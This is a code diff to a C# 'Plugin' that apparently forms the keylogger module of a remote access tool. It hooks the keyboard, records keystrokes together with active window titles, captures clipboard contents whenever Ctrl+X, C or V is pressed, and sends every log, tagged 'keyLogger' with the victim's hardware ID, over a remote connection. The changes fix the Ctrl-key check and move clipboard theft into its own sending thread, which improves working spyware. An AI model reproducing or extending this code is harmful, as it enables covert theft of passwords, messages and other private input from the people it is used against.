@@ -88,7 +88,7 @@ namespace Plugin
                     int vkCode = Marshal.ReadInt32(lParam);
                     bool capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
                     bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
-                    bool ctrlPressed = (GetKeyState(0xA2) & 0xffff) != 0 || (GetKeyState(0xA3) & 0xffff) != 0;
+                    bool ctrlPressed = (GetKeyState(0xA2) & 0x8000) != 0 || (GetKeyState(0xA3) & 0x8000) != 0;
                     string currentKey = KeyboardLayout((uint)vkCode);
 
                     if (capsLockPressed || shiftPressed)
@@ -102,26 +102,13 @@ namespace Plugin
 
                     if (ctrlPressed)
                     {
-                        switch ((Keys)vkCode)
+                        if (((Keys)vkCode == Keys.X) || ((Keys)vkCode == Keys.C) || ((Keys)vkCode == Keys.V))
                         {
-                            case Keys.X:
-                                {
-                                    currentKey = $"[CTRL+X]:{ClipboardGetText()}\n";
-                                    break;
-                                }
-                            case Keys.C:
-                                {
-                                    currentKey = $"[CTRL+C]:{ClipboardGetText()}\n";
-                                    break;
-                                }
-                            case Keys.V:
-                            {
-                                    currentKey = $"[CTRL+V]:{ClipboardGetText()}\n";
-                                    break;
-                            }
+                            ClipboardGetText(((Keys)vkCode).ToString());
+                            currentKey = string.Empty;
                         }
                     }
-                   else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                    else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                         currentKey = "[" + (Keys)vkCode + "]";
                     else
                     {
@@ -145,24 +132,27 @@ namespace Plugin
                         }
                     }
 
-                    StringBuilder sb = new StringBuilder();
-                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
+                    if (!string.IsNullOrWhiteSpace(currentKey))
                     {
-                        sb.Append(currentKey);
+                        StringBuilder sb = new StringBuilder();
+                        if (CurrentActiveWindowTitle == GetActiveWindowTitle())
+                        {
+                            sb.Append(currentKey);
+                        }
+                        else
+                        {
+                            sb.Append(Environment.NewLine);
+                            sb.Append(Environment.NewLine);
+                            sb.Append($"###  {GetActiveWindowTitle()} ###");
+                            sb.Append(Environment.NewLine);
+                            sb.Append(currentKey);
+                        }
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
+                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                        msgpack.ForcePathObject("log").AsString = sb.ToString();
+                        Connection.Send(msgpack.Encode2Bytes());
                     }
-                    else
-                    {
-                        sb.Append(Environment.NewLine);
-                        sb.Append(Environment.NewLine);
-                        sb.Append($"###  {GetActiveWindowTitle()} ###");
-                        sb.Append(Environment.NewLine);
-                        sb.Append(currentKey);
-                    }
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
-                    msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                    msgpack.ForcePathObject("log").AsString = sb.ToString();
-                    Connection.Send(msgpack.Encode2Bytes());
                 }
                 return CallNextHookEx(_hookID, nCode, wParam, lParam);
             }
@@ -172,22 +162,25 @@ namespace Plugin
             }
         }
 
-        private static string ClipboardGetText()
+        private static void ClipboardGetText(string key)
         {
-            string ReturnValue = string.Empty;
             Thread STAThread = new Thread(
                 delegate ()
                 {
                     if (Clipboard.ContainsText())
                     {
+                        Thread.Sleep(500);
+                        string ReturnValue = string.Empty;
                         ReturnValue = Clipboard.GetText();
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
+                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                        msgpack.ForcePathObject("log").AsString = $"\n[CTRL+{key}]:{ReturnValue}\n";
+                        Connection.Send(msgpack.Encode2Bytes());
                     }
                 });
             STAThread.SetApartmentState(ApartmentState.STA);
             STAThread.Start();
-            STAThread.Join();
-
-            return ReturnValue;
         }
 
         private static string KeyboardLayout(uint vkCode)
